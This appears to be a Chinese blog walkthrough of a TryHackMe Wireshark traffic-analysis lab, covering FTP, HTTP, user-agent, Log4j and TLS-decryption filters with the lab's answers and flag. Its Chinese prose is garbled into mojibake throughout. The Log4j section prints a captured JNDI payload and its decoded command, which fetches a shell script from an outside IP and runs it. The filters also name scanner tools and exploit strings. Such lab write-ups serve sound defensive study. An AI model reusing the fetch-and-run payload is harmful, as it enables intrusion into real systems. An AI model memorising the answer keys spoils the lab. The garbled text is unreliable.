<td><strong>âx3xâç³»åéé¡¹ï¼å©æ¨è½»æ¾æåæå®ï¼</strong><br><br>- <strong>230ï¼</strong>ç¨æ·ç»å½ã<br>- <strong>231ï¼</strong>ç¨æ·æ³¨éã<br>- <strong>331ï¼</strong>ææçç¨æ·åã<br>- <strong>430ï¼</strong>ç¨æ·åæå¯ç æ æ<br>- <strong>530ï¼</strong>æ æ³ç»å½ï¼å¯ç æ æã</td>
<td>- <code>ftp.response.code == 230</code></td>
</tr>
<tr>
<td><strong>ä½¿ç¨â FTP âå½ä»¤å¿«éè·åæéèµæºï¼</strong><br><br>- <strong>ç¨æ·ï¼</strong>ç¨æ·åã<br>- <strong>å¯ç ï¼</strong> PASSã<br>- <strong>CWDï¼</strong>å½åå·¥ä½ç®å½ã<br>- <strong>åè¡¨ï¼</strong>åè¡¨ã</td>
<td>- <code>ftp.request.command == "USER"</code><br><br>- <code>ftp.request.command == "PASS"</code><br><br>- <code>ftp.request.arg == "password"</code></td>
</tr>
<tr>
<td>é«çº§ç¨æ³ç¤ºä¾ï¼å¦ä½è½»æ¾è·åå¾æå¯å¾çææï¼<br><br>- <strong>æ´åç ´è§£ä¿¡å·ï¼</strong>ååºå¤±è´¥çç»å½å°è¯ã<br>- <strong>æ´åç ´è§£ä¿¡å·ï¼</strong>ååºç®æ ç¨æ·åã<br>- <strong>å¯ç å·æ´ä¿¡å·ï¼</strong>ååºéæå¯ç çæ»å»ç®æ ã</td>
<td>- <code>ftp.response.code == 530</code><br><br>- <code>(ftp.response.code == 530) and (ftp.response.arg contains "username")</code><br><br>- <code>(ftp.request.command == "PASS" ) and (ftp.request.arg == "password")</code></td>
</tr>
</tbody>
</table>
<p><img src="https://i-blog.csdnimg.cn/img_convert/c856abb3b4216221be8294ef148c5963.png" alt="" loading="lazy"></p>
<hr>
<p>è¯·åç­ä»¥ä¸é®é¢</p>
<p>æ»å±æå¤å°æ¬¡ç»å½éè¯¯å°è¯ï¼<br>
ç­éï¼<code>ftp.response.code == 530</code><br>
<img src="https://i-blog.csdnimg.cn/img_convert/9a9eea0f430c8da3ceaca5515cd5644a.png" alt="" loading="lazy"></p>
<pre><code class="language-python">737
</code></pre>
<p>âftpâè´¦æ·è®¿é®çæä»¶å¤§å°æ¯å¤å°ï¼<br>
ç­éï¼<code>ftp.response.code == 213</code><br>
<img src="https://i-blog.csdnimg.cn/img_convert/4938707ba5d2477f9c35f0b80c379bc9.png" alt="" loading="lazy"></p>
<pre><code class="language-python">39424
</code></pre>
<p>æ»å»èåFTPæå¡å¨ä¸ä¼ äºä¸ä¸ªææ¡£ãæä»¶åæ¯ä»ä¹ï¼<br>
ç­éï¼<code>ftp.request.command == "RETR"</code><br>
<img src="https://i-blog.csdnimg.cn/img_convert/f1033de1bcfcd64c739b41a0d0f78c58.png" alt="" loading="lazy"></p>
<pre><code class="language-python">resume.doc
</code></pre>
<p>æ»å»èè¯å¾éè¿æ·»å ç¹æ®æ å¿æ¥æ´æ¹ä¸ä¼ æä»¶çæ§è¡æéãæ»å»èä½¿ç¨çå½ä»¤æ¯ä»ä¹ï¼<br>
ç­éï¼<code>ftp contains "CHMOD"</code></p>
<pre><code class="language-python">CHMOD 777
</code></pre>
<h4 id="ææåè®®åæhttp">ææåè®®åæï¼HTTP</h4>
<p>è¶ææ¬ä¼ è¾ââåè®® ( HTTP ) æ¯ä¸ç§åºäºææçè¯·æ±-ååºå¼å®¢æ·ç«¯-æå¡å¨åè®®ãå®æ¯è¯·æ±/æä¾ç½é¡µçæ åç½ç»æ´»å¨ç±»åï¼é»è®¤æåµä¸ä¸ä¼è¢«ä»»ä½ç½ç»è¾¹çé»æ­¢ãç±äºå¶æªå å¯ä¸æ¯ç½ç»æµéçä¸»å¹²ï¼HTTPæ¯æµéåæä¸­å¿é¡»äºè§£çåè®®ä¹ä¸ãä»¥ä¸æ»å»å¯ä»¥éè¿HTTPåææ£æµå°ï¼</p>
<ul>
<li>éé±¼é¡µé¢</li>
<li>ç½ç»æ»å»</li>
<li>æ°æ®æ³é²</li>
<li>ææ¥æ§å¶æµéï¼C2ï¼</li>
</ul>
<p><strong>HTTPåæç®è¿°ï¼</strong></p>
<table>
<thead>
<tr>
<th><strong>ç¬è®°</strong></th>
<th><strong>Wiresharkè¿æ»¤å¨</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>å¨çæç´¢<br><br><strong>æ³¨ï¼ HTTP2 æ¯</strong>HTTPåè®® çä¿®è®¢çï¼æ¨å¨æåæ§è½åå®å¨æ§ãå®æ¯æäºè¿å¶æ°æ®ä¼ è¾åè¯·æ±/ååºå¤ç¨ã</td>
<td>- <code>http</code><br><br>- <code>http2</code></td>
</tr>
<tr>
<td>å©ç¨âHTTP <strong>è¯·æ±æ¹æ³â</strong>å¿«éè·åæéèµæºï¼<br><br>- å¾å°<br>- é®æ¿<br>- è¯·æ±ï¼ååºææè¯·æ±</td>
<td>- <code>http.request.method == "GET"</code><br><br>- <code>http.request.method == "POST"</code><br><br>- <code>http.request</code></td>
</tr>
<tr>
<td>å©ç¨ â HTTP ååºç¶æç â è·åå¾æå¯å¾çææï¼<br><br>- <strong>200 OKï¼</strong> è¯·æ±æåã<br>- <strong>301 æ°¸ä¹éå®åï¼</strong> èµæºå·²ç§»å¨å°æ°ç URL/è·¯å¾ï¼æ°¸ä¹ï¼ã<br>- <strong>302 ä¸´æ¶éå®åï¼</strong> èµæºå·²ç§»å¨å°æ°ç URL/è·¯å¾ï¼ä¸´æ¶ï¼ã<br>- <strong>400 éè¯¯è¯·æ±ï¼</strong> æå¡å¨æ æ³çè§£è¯¥è¯·æ±ã<br>- <strong>401 æªææï¼</strong> URL éè¦ææï¼ç»å½ç­ï¼ã<br>- <strong>403 ç¦æ­¢è®¿é®ï¼</strong> æ æè®¿é®æè¯·æ±ç URLã <br>- <strong>404 Not Foundï¼</strong> æå¡å¨æ¾ä¸å°è¯·æ±ç URLã<br>- <strong>405 æ¹æ³ä¸åè®¸ï¼</strong> ä½¿ç¨çæ¹æ³ä¸åéæå·²è¢«é»æ­¢ã<br>- <strong>408 è¯·æ±è¶æ¶ï¼</strong>  è¯·æ±ç­å¾æ¶é´è¶è¿æå¡å¨ç­å¾æ¶é´ã<br>- <strong>500 åé¨æå¡å¨éè¯¯ï¼</strong> è¯·æ±æªå®æï¼åºç°æå¤éè¯¯ã<br>- <strong>503 æå¡ä¸å¯ç¨ï¼</strong> è¯·æ±æªå®æï¼æå¡å¨ææå¡å·²å³é­ã</td>
<td>- <code>http.response.code == 200</code><br><br>- <code>http.response.code == 401</code><br><br>- <code>http.response.code == 403</code><br><br>- <code>http.response.code == 404</code><br><br>- <code>http.response.code == 405</code><br><br>- <code>http.response.code == 503</code></td>
</tr>
<tr>
<td><strong>å©ç¨â HTTP</strong> <strong>åæ°âå¿«éè·åæéä¿¡æ¯ï¼</strong><br><br>- <strong>ç¨æ·ä»£çï¼</strong>ç¨äºè¯å« Web æå¡å¨åºç¨ç¨åºçæµè§å¨åæä½ç³»ç»ã<br>- <strong>è¯·æ± URIï¼</strong>æåæå¡å¨ä¸è¯·æ±çèµæºã<br>- <strong>å®æ´ URIï¼</strong>å®æ´ç URI ä¿¡æ¯ã<br><br>*<strong>URIï¼</strong>ç»ä¸èµæºæ è¯ç¬¦ã</td>
<td>- <code>http.user_agent contains "nmap"</code><br><br>- <code>http.request.uri contains "admin"</code><br><br>- <code>http.request.full_uri contains "admin"</code></td>
</tr>
<tr>
<td><strong>å©ç¨â HTTPåæ°âå¿«éè·åæéä¿¡æ¯ï¼</strong><br><br>- <strong>æå¡å¨ï¼</strong>æå¡å¨æå¡åç§°ã<br>- <strong>ä¸»æºï¼</strong>æå¡å¨çä¸»æºå<br>- <strong>è¿æ¥ï¼</strong>è¿æ¥ç¶æã<br>- <strong>åºäºè¡çææ¬æ°æ®ï¼</strong>æå¡å¨æä¾çæææ°æ®ã<br>- <strong>HTMLè¡¨åURLç¼ç ï¼</strong>ç½é¡µè¡¨åä¿¡æ¯ã</td>
<td>- <code>http.server contains "apache"</code><br><br>- <code>http.host contains "keyword"</code><br><br>- <code>http.host == "keyword"</code><br><br>- <code>http.connection == "Keep-Alive"</code><br><br>- <code>data-text-lines contains "keyword"</code></td>
</tr>
</tbody>
</table>
<h5 id="ç¨æ·ä»£çåæ">ç¨æ·ä»£çåæ</h5>
<p>ç±äºæ»å»èä¼ä½¿ç¨å¤æçææ¯æ¥å®æ½æ»å»ï¼ä»ä»¬ä¼è¯å¾éè¿å·²ç¥ä¸å¯ä¿¡çåè®®çä¸ä¸æ­£å¸¸æµéç¸ä¼¼ççè¿¹ãå¯¹äºå®å¨åæå¸èè¨ï¼è¯å«æ°æ®åä¸­çå¼å¸¸ä¿¡å·è³å³éè¦ãâuser-agentâå­æ®µæ¯åç°HTTPæµéå¼å¸¸çéè¦èµæºä¹ä¸ãå¨æäºæåµä¸ï¼æ»å»èä¼æåä¿®æ¹user-agentæ°æ®ï¼ä½¿å¶çèµ·æ¥éå¸¸èªç¶ãå®å¨åæå¸ä¸è½ä»ä»ä¾èµuser-agentå­æ®µæ¥åç°å¼å¸¸ãå³ä½¿user-agentçèµ·æ¥å¾æ­£å¸¸ï¼ä¹æ°¸è¿ä¸è¦å°å¶å å¥ç½ååãåºäºuser-agentçå¼å¸¸/å¨èæ£æµ/æå¯»æ¯éè¦æ£æ¥çé¢å¤æ°æ®æ¥æºï¼å¨åç°ææ¾å¼å¸¸æ¶éå¸¸æç¨ãå¦ææ¨å¯¹æä¸ªå¼ä¸ç¡®å®ï¼å¯ä»¥è¿è¡ç½ç»æç´¢ï¼ä½¿ç¨é»è®¤çæ­£å¸¸user-agentä¿¡æ¯æ¥éªè¯æ¨çåç°ï¼ä¾å¦ï¼<a href="https://developers.whatismybrowser.com/useragents/explore/" target="_blank" rel="noopener nofollow"><strong>åèç¤ºä¾ç½ç«ï¼https://developers.whatismybrowser.com/useragents/explore/</strong></a>ï¼ã</p>
<p><strong>ç¨æ·ä»£çåæç®è¿°ï¼</strong></p>
<table>
<thead>
<tr>
<th><strong>ç¬è®°</strong></th>
<th><strong>Wiresharkè¿æ»¤å¨</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>å¨çæç´¢ã</td>
<td>- <code>http.user_agent</code></td>
</tr>
<tr>
<td><strong>æ¨å¨è·åå¾æå¯å¾ææçç ç©¶ææï¼</strong><br><br>- ç­æ¶é´åæ¥èªåä¸ä¸»æºçä¸åç¨æ·ä»£çä¿¡æ¯ã<br>- éæ ååèªå®ä¹ç¨æ·ä»£çä¿¡æ¯ã<br>- æ¼åç¥æä¸åã<strong>ï¼âMozillaâä¸âMozlillaâæâMozlilaâå¹¶ä¸ç¸åï¼</strong><br>- ç¨æ·ä»£çå­æ®µä¸­åå« NmapãNiktoãWfuzz å sqlmap ç­å®¡è®¡å·¥å·çä¿¡æ¯ã<br>- ç¨æ·ä»£çå­æ®µä¸­çææè½½è·æ°æ®ã</td>
<td>- <code>(http.user_agent contains "sqlmap") or (http.user_agent contains "Nmap") or (http.user_agent contains "Wfuzz") or (http.user_agent contains "Nikto")</code></td>
</tr>
<tr>
<td><img src="https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081147138-2135458459.png" alt="" loading="lazy"></td>
<td></td>
</tr>
</tbody>
</table>
<h5 id="log4j-åæ">Log4j åæ</h5>
<p>ä¸æ¬¡å¨é¢çè°æ¥å§äºå¯¹å³å°è¿½è¸ªçå¨èåå¼å¸¸æåµè¿è¡é¢åç ç©¶ãå¨å¯å¨ Wireshark ä¹åï¼è®©æä»¬ååé¡¾ä¸ä¸å³äºâLog4jâæ»å»çå·²ç¥ä¿¡æ¯ã</p>
<p><strong>Log4jæ¼æ´åæç®è¿°ï¼</strong></p>
<table>
<thead>
<tr>
<th><strong>ç¬è®°</strong></th>
<th><strong>Wireshark è¿æ»¤å¨</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>æ¨å¨è·åå¾æå¯å¾ææç<strong>ç ç©¶ææ ï¼</strong><br><br>- æ»å»å§äºä¸ä¸ªâPOSTâè¯·æ±ã<br>- å·²ç¥å­å¨æææ¨¡å¼ï¼â <strong>jndi:ldap</strong> âåâ <strong>Exploit.class</strong> âã</td>
<td>- <code>http.request.method == "POST"</code><br><br>- <code>(ip contains "jndi") or ( ip contains "Exploit")</code><br><br>- <code>(frame contains "jndi") or ( frame contains "Exploit")</code><br><br>- <code>(http.user_agent contains "$") or (http.user_agent contains "==")</code></td>
</tr>
<tr>
<td><img src="https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081145469-45977977.png" alt="" loading="lazy"></td>
<td></td>
</tr>
</tbody>
</table>
<hr>
<p>è¯·åç­ä»¥ä¸é®é¢</p>
<p>è°æ¥ç¨æ·ä»£çãå¼å¸¸çâç¨æ·ä»£çâç±»åæå¤å°ç§ï¼<br>
ç­éï¼<code>http.user_agent</code><br>
<img src="https://i-blog.csdnimg.cn/img_convert/755fb92f9cb7d4cfc93fb92f65398d85.png" alt="" loading="lazy"><br>
æ¢æ¢ç¿»æ¾ï¼å®éä¸æ6ç§ä¸æ¯å¸¸è§çuaå¤´<br>
<img src="https://i-blog.csdnimg.cn/img_convert/2c239b4f5099f5f9bb8198afc1b5a9bb.png" alt="" loading="lazy"></p>
<pre><code class="language-python">6
</code></pre>
<p>ç¨æ·ä»£çå­æ®µä¸­æ¼åç¥æä¸åçæ°æ®åç¼å·æ¯å¤å°ï¼<br>
æ³¨æçæ¯Mozli å Mozil çåºå«<br>
<img src="https://i-blog.csdnimg.cn/img_convert/d220f05e1ed53710aa3a04097c9823df.png" alt="" loading="lazy"></p>
<pre><code class="language-python">52
</code></pre>
<p>æ¾å°âLog4jâæ»å»çèµ·å§é¶æ®µãæ°æ®åç¼å·æ¯å¤å°ï¼<br>
ç­éï¼<code>(http.user_agent contains "$") or (http.user_agent contains "==")</code><br>
<img src="https://i-blog.csdnimg.cn/img_convert/8587effc9c8f423cd503d2e89f17766f.png" alt="" loading="lazy"></p>
<pre><code class="language-python">444
</code></pre>
<p>æ¾å°âLog4jâæ»å»çèµ·å§é¶æ®µå¹¶è§£ç base64å½ä»¤ãæ»å»èèç³»çIPå°åæ¯ä»ä¹ï¼<br>
å¤å¶é£æ®µbaseå¼è§£ç <code>${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}</code><br>
<img src="https://i-blog.csdnimg.cn/img_convert/f9d65bf950b9bda441b5c17c08a16665.png" alt="" loading="lazy"><br>
<code>wget http://62.210.130.250/lh.sh;chmod +x lh.sh;./lh.sh</code></p>
<pre><code class="language-python">62[.]210[.]130[.]250
</code></pre>
<h4 id="å å¯åè®®åæè§£å¯-https">å å¯åè®®åæï¼è§£å¯ HTTPS</h4>
<p>å¨è°æ¥ç½ç»æµéæ¶ï¼åæäººåç»å¸¸ä¼éå°å å¯æµéãè¿æ¯å ä¸ºä¸ºäºå¢å¼ºå®å¨æ§ï¼é²æ­¢æ¬ºéªãåæ¢åæ¦æªæ»å»ï¼ç½ç»æµééå¸¸ä¼ä½¿ç¨è¶ææ¬ä¼ è¾ââå®å¨åè®® (HTTPS)ãHTTPS ä½¿ç¨TLSåè®®å¯¹éä¿¡è¿è¡å å¯ï¼å æ­¤å¦ææ²¡æå å¯/è§£å¯å¯é¥å¯¹ï¼å°±æ æ³è§£å¯æµéå¹¶æ¥çä¼ è¾çæ°æ®ãç±äºè¯¥åè®®ä¸ºä¼ è¾æææ°æ®æä¾äºè¯å¥½çå®å¨æ§ï¼æ»å»èåæ¶æç½ç«ä¹ä¼ä½¿ç¨ HTTPSãå æ­¤ï¼å®å¨åæäººååºè¯¥äºè§£å¦ä½ä½¿ç¨å¯é¥æä»¶æ¥è§£å¯å å¯æµéå¹¶è°æ¥æµéæ´»å¨ã</p>
<p>ç±äºHTTPæµéç»è¿å å¯ï¼æ°æ®åä¼ä»¥ä¸åçé¢è²æ¾ç¤ºãæ­¤å¤ï¼åè®®åä¿¡æ¯è¯¦æï¼å®é URL å°ååæå¡å¨è¿åçæ°æ®ï¼ä¹ä¸ä¼å®å¨å¯è§ãä¸å¾æ¾ç¤ºäºä½¿ç¨TLSåè®®å å¯çHTTPæ°æ®åã</p>
<p><strong>å³äºHTTPSçè¡¥åä¿¡æ¯ï¼</strong></p>
<table>
<thead>
<tr>
<th><strong>ç¬è®°</strong></th>
<th><strong>Wiresharkè¿æ»¤å¨</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>å©ç¨âHTTPS åæ°â</strong> è½»æ¾è·åææï¼<br><br>- <strong>è¯·æ±ï¼</strong>ååºææè¯·æ±<br>- <strong>TLSï¼</strong>å¨å±TLSæç´¢<br>- TLSå®¢æ·ç«¯è¯·æ±<br>- TLSæå¡å¨ååº<br>- æ¬å°ç®åæå¡åç°åè®® (SSDP)<br><br><strong>æ³¨ï¼</strong>  SSDP æ¯ä¸ç§ç½ç»åè®®ï¼ç¨äºæä¾ç½ç»æå¡çéåååç°ã</td>
<td>- <code>http.request</code><br><br>- <code>tls</code><br><br>- <code>tls.handshake.type == 1</code><br><br>- <code>tls.handshake.type == 2</code><br><br>- <code>ssdp</code></td>
</tr>
<tr>
<td><img src="https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081137415-1124783996.png" alt="" loading="lazy"></td>
<td></td>
</tr>
<tr>
<td>ä¸ TCP ä¸æ¬¡æ¡æè¿ç¨ç±»ä¼¼ï¼TLS åè®®ä¹æèªå·±çæ¡æè¿ç¨ãåä¸¤ä¸ªæ­¥éª¤åå«âå®¢æ·ç«¯ Helloâåâæå¡å¨ Helloâæ¶æ¯ãæä¾çè¿æ»¤å¨ä¼æ¾ç¤ºæè·æä»¶ä¸­çåå§ Hello æ°æ®åãè¿äºè¿æ»¤å¨æå©äºè¯å«åä¸ TLS æ¡æç IP å°åã</td>
<td></td>
</tr>
</tbody>
</table>
<ul>
<li>Client Helloï¼<code>(http.request or tls.handshake.type == 1) and !(ssdp)</code></li>
<li>Server Helloï¼ <code>(http.request or tls.handshake.type == 2) and !(ssdp)</code></li>
</ul>
<p><img src="https://i-blog.csdnimg.cn/img_convert/505cf88ff7b555cccf3ea7650b60c107.png" alt="500" loading="lazy"></p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/13aa08663fdf12f8118fb1d38b6a53e9.png" alt="500" loading="lazy"></p>
<p>å å¯å¯é¥æ¥å¿æä»¶æ¯ä¸ä¸ªææ¬æä»¶ï¼å¶ä¸­åå«ç¨äºè§£å¯å å¯æµéä¼è¯çå¯ä¸å¯é¥å¯¹ãå½ä¸å¯ç¨ SSL/ TLSçç½é¡µå»ºç«è¿æ¥æ¶ï¼è¿äºå¯é¥å¯¹ä¼èªå¨åå»ºï¼æ¯ä¸ªä¼è¯ä¸ä¸ªå¯é¥å¯¹ï¼ãç±äºè¿äºè¿ç¨é½å¨æµè§å¨ä¸­å®æï¼å æ­¤æ¨éè¦éç½®ç³»ç»å¹¶ä½¿ç¨åéçæµè§å¨ï¼Chrome å Firefox åæ¯ææ­¤åè½ï¼å°è¿äºå¼ä¿å­ä¸ºå¯é¥æ¥å¿æä»¶ãä¸ºæ­¤ï¼æ¨éè¦è®¾ç½®ä¸ä¸ªç¯å¢åéå¹¶åå»º SSLKEYLOGFILE æä»¶ï¼æµè§å¨ä¼å¨æ¨æµè§ç½é¡µæ¶å°å¯é¥è½¬å¨å°æ­¤æä»¶ä¸­ãSSL/ TLSå¯é¥å¯¹å¨è¿æ¥æ¶ä¸ºæ¯ä¸ªä¼è¯åå»ºï¼å æ­¤å¨æµéæè·æé´è½¬å¨å¯é¥è³å³éè¦ãå¦åï¼å°æ æ³åå»º/çæåéçå¯é¥æ¥å¿æä»¶æ¥è§£å¯æè·çæµéãæ¨å¯ä»¥ä½¿ç¨âå³é®åå»âèåæ <strong>âç¼è¾â-&gt;âé¦éé¡¹â-&gt;âåè®®â-&gt; âTLS â</strong> èåæ¥æ·»å /å é¤å¯é¥æ¥å¿æä»¶ã</p>
<p><strong>ä½¿ç¨âå³é®åå»âèåæ·»å å³é®æ¥å¿æä»¶ï¼</strong><br>
<img src="https://i-blog.csdnimg.cn/img_convert/053a467213a6c280c66a64a56679b22e.gif" alt="" loading="lazy"></p>
<p><strong>ä½¿ç¨âç¼è¾ --&gt; é¦éé¡¹ --&gt; åè®® --&gt; TLS â æ·»å å³é®æ¥å¿æä»¶</strong><br>
<img src="https://i-blog.csdnimg.cn/img_convert/49eb7928ec905a40255def63440e5f29.gif" alt="" loading="lazy"></p>
<p><strong>æ¥çåå«/ä¸åå«å³é®æ¥å¿æä»¶çæµéï¼</strong><br>
<img src="https://i-blog.csdnimg.cn/img_convert/daebaeae0b7f4302ee7b2f8aa42ccdd1.gif" alt="" loading="lazy"></p>
<p>ä¸å¾æ¾ç¤ºï¼ä½¿ç¨å¯é¥æ¥å¿æä»¶åï¼æµéè¯¦æå¯è§ãè¯·æ³¨æï¼âæ°æ®åè¯¦æâåâå­èâçªæ ¼ä»¥ä¸åæ ¼å¼æä¾æ°æ®ä»¥ä¾åæãè§£å¯æµéåï¼å³å¯æ¥çè§£åç¼©åçå¤´é¨ä¿¡æ¯å HTTP/2 æ°æ®åè¯¦æãæ ¹æ®æ°æ®åè¯¦æçä¸åï¼æ¨è¿å¯ä»¥è·å¾ä»¥ä¸æ°æ®æ ¼å¼ï¼</p>
<ul>
<li>æ¡æ¶</li>
<li>å·²è§£å¯çTLS</li>
<li>è§£åç¼©åçå¤´é¨</li>
<li>éæ°ç»è£ç TCP</li>
<li>éæ°ç»è£ç SSL</li>
</ul>
<hr>
<p>è¯·åç­ä»¥ä¸é®é¢</p>
<p>åéå°âaccounts.google.comâçâClient Helloâæ¶æ¯çå¸§å·æ¯å¤å°ï¼<br>
ç­éï¼<code>(http.request or tls.handshake.type == 1) and !(ssdp)</code><br>
<img src="https://i-blog.csdnimg.cn/img_convert/a8651a913508e9ad16ccc373740aae05.png" alt="" loading="lazy"></p>
<pre><code class="language-python">16
</code></pre>
<p>ä½¿ç¨âKeysLogFile.txtâæä»¶è§£å¯æµéãHTTP2æ°æ®åçæ°éæ¯å¤å°ï¼<br>
<strong>âEdit â Preferences â Protocols â TLSâ</strong><br>
<img src="https://i-blog.csdnimg.cn/img_convert/e6f899ae0ad345b31cafbbd5007d3f8a.png" alt="" loading="lazy"><br>
<img src="https://i-blog.csdnimg.cn/img_convert/e028b92cac66aaf1e9ead49b693e621e.png" alt="" loading="lazy"></p>
<pre><code class="language-python">115
</code></pre>
<p>è¯·è½¬å°ç¬¬ 322 å¸§ãHTTP2 æ°æ®åçææå¤´é¨æ¯ä»ä¹ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/92ab5eb265ab721d8459604a4599c9b4.png" alt="" loading="lazy"></p>
<pre><code class="language-python">safebrowsing[.]googleapis[.]com
</code></pre>
<p>ä¿å­ä¸ä¸ªå«flag.txtè¯·æ±çæ°æ®åå³å¯<br>
<img src="https://i-blog.csdnimg.cn/img_convert/60d45708a6b3d97d17f2cfa81940aac1.png" alt="" loading="lazy"><br>
æå¼æä»¶<br>
<img src="https://i-blog.csdnimg.cn/img_convert/ecde8d036395682b954638c699f798d5.png" alt="" loading="lazy"></p>
<pre><code class="language-python">FLAG{THM-PACKETMASTER}
</code></pre>
<h4 id="å¥å±å¯»æ¾ææå­è¯">å¥å±ï¼å¯»æ¾ææå­è¯ï¼</h4>
<p>å°ç®åä¸ºæ­¢ï¼æä»¬è®¨è®ºäºå¦ä½æ£æ¥æ°æ®åæ¯å¦å­å¨ç¹å®æåµå¹¶åç°å¼å¸¸ãæ­£å¦ç¬¬ä¸é´ä¼è®®å®¤æå°çï¼Wireshark å¹¶éå¥ä¾µæ£æµç³»ç» (IDS)ï¼ä½å®ä¼å¨ä¸å®¶ä¿¡æ¯ä¸­éå¯¹æäºæåµæä¾å»ºè®®ãç¶èï¼ææ¶å¼å¸¸æµéä¼ä¼ªè£ææ­£å¸¸æµéï¼è¿ä½¿å¾æ£æµåå¾æ´å å°é¾ãä¾å¦ï¼å¨ææå­æ®æ»å»æ¡ä¾ä¸­ï¼å¾é¾åç°å¤ä¸ªå­æ®è¾å¥ï¼ä¹é¾ä»¥å¤æ­è¿æ¯æ´åç ´è§£æ»å»è¿æ¯æ®éç¨æ·è¯¯è¾äºå­æ®ã</p>
<p>ç±äºææä¿¡æ¯é½ä»¥æ°æ®åçå½¢å¼åç°ï¼å æ­¤å¾é¾ä¸ç¼çåºå¤ä¸ªç¨æ·å/å¯ç æ¡ç®ãå¦æåæäººåè½å¤ä»¥åè¡¨å½¢å¼æ¥çå­æ®æ¡ç®ï¼æ£æµæ¶é´å°ä¼ç¼©ç­ãWireshark å·å¤è¿æ ·çåè½ï¼å¯ä»¥å¸®å©åæäººåæ¥æ¾ææå­æ®æ¡ç®ã</p>
<p>é¨å Wireshark æ°æ®ååæå¨ï¼FTPãHTTPãIMAPãPOP åSMTPï¼å¯ä»¥æåæè·æä»¶ä¸­çææå¯ç ãæ¨å¯ä»¥ä½¿ç¨ <strong>âå·¥å· --&gt; å­æ®â</strong> èåæ¥çæ£æµå°çå­æ®ãæ­¤åè½ä»éç¨äºç¹å®çæ¬ç Wiresharkï¼v3.1 åæ´é«çæ¬ï¼ãç±äºè¯¥åè½ä»éç¨äºç¹å®åè®®ï¼å æ­¤å»ºè®®è¿è¡æå¨æ£æ¥ï¼ä¸è¦å®å¨ä¾èµæ­¤åè½æ¥å¤æ­æµéä¸­æ¯å¦å­å¨ææå­æ®ã</p>
<p>ä½¿ç¨è¯¥åè½åï¼å®ä¼æå¼ä¸ä¸ªæ°çªå£ï¼æ¾ç¤ºæ£æµå°çå­æ®ãçªå£ä¼æ¾ç¤ºæ°æ®åç¼å·ãåè®®ãç¨æ·ååå¶ä»ä¿¡æ¯ãæ­¤çªå£å¯ç¹å»ï¼ç¹å»æ°æ®åç¼å·å°éæ©åå«å¯ç çæ°æ®åï¼ç¹å»ç¨æ·åå°éæ©åå«ç¨æ·åä¿¡æ¯çæ°æ®åãâå¶ä»ä¿¡æ¯âé¨åä¼æç¤ºåå«ç¨æ·åçæ°æ®åç¼å·ã</p>
<p><img src="https://i-blog.csdnimg.cn/img_convert/4666a693678694cc012741294bde0bee.png" alt="" loading="lazy"></p>
<p>è¿ä¸ªå·¥å·å¤ªå±äºï¼</p>
<hr>
<p>è¯·åç­ä»¥ä¸é®é¢</p>
<p>ä½¿ç¨âHTTP åºæ¬èº«ä»½éªè¯âæ¶ï¼å­æ®çæ°æ®åç¼å·æ¯å¤å°ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/6fdaf470f8bd969a60ff6d19a89dc85c.png" alt="" loading="lazy"></p>
<pre><code class="language-python">237
</code></pre>
<p>æäº¤âç©ºå¯ç âçæ°æ®åç¼å·æ¯å¤å°ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/e974bec189785cf99469630366381c82.png" alt="" loading="lazy"></p>
<pre><code class="language-python">170
</code></pre>
<h4 id="é¢å¤ç¦å©å¯æ§è¡çç»æ">é¢å¤ç¦å©ï¼å¯æ§è¡çç»æï¼</h4>
<p>æ¨å·²è°æ¥äºç½ç»æµéï¼æ£æµå°äºå¼å¸¸æåµï¼å¹¶åå»ºäºç¬è®°ä»¥ä¾è¿ä¸æ­¥è°æ¥ãæ¥ä¸æ¥è¯¥åä»ä¹ï¼å¹¶éæææ¡ä¾è°æ¥é½ç±å¢éåä½å®æãä½ä¸ºå®å¨åæå¸ï¼æäºæåµä¸æ¨éè¦èªè¡åç°å¼å¸¸ãç¡®å®æºå¤´å¹¶éåè¡å¨ã<br>
Wireshark çåè½ä¸ä»éäºæ°æ®åç»èï¼å®è¿å¯ä»¥å¸®å©æ¨åå»ºé²ç«å¢è§åï¼åªéç¹å»å ä¸å³å¯å®æ½ãæ¨å¯ä»¥ä½¿ç¨ <strong>âå·¥å· --&gt;</strong> <strong>é²ç«å¢<strong><strong>ACL</strong></strong>è§åâèååå»º</strong>é²ç«å¢è§å ãä½¿ç¨æ­¤åè½åï¼å®å°æå¼ä¸ä¸ªæ°çªå£ï¼å¹¶æä¾ä¸ç³»åè§åï¼åºäº IPãç«¯å£å MAC å°åï¼ï¼ä»¥æ»¡è¶³ä¸åçéæ±ãè¯·æ³¨æï¼è¿äºè§åæ¯ä¸ºå¨å¤é¨é²ç«å¢æ¥å£ä¸å®æ½èçæçã</p>
<p>ç®åï¼Wireshark å¯ä»¥åå»ºä»¥ä¸è§åï¼</p>
<ul>
<li>Netfilterï¼iptablesï¼</li>
<li>Cisco IOSï¼æ åç/æ©å±çï¼</li>
<li>IPè¿æ»¤å¨ï¼ipfilterï¼</li>
<li>IPé²ç«å¢ï¼ipfwï¼</li>
<li>æ°æ®åè¿æ»¤å¨ï¼pfï¼</li>
<li>Windowsé²ç«å¢ï¼netsh æ°/æ§æ ¼å¼ï¼</li>
</ul>
<p><img src="https://i-blog.csdnimg.cn/img_convert/f161b25dca3abf5fbdeea5781dbd718d.png" alt="" loading="lazy"></p>
<hr>
<p>è¯·åç­ä»¥ä¸é®é¢</p>
<p>éæ©æ°æ®åç¼å·99ï¼ç¶åç¹å¼âIPFirewall (ipfw)âï¼æ¾å°è¿æ¡âæç»denyæºIPv4å°åâçè§åï¼çä»åçæ¯ä»ä¹ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/20cc86aa3cef0c9196a862b68ef40a66.png" alt="500" loading="lazy"></p>
<pre><code class="language-python">add deny ip from 10.121.70.151 to any in
</code></pre>
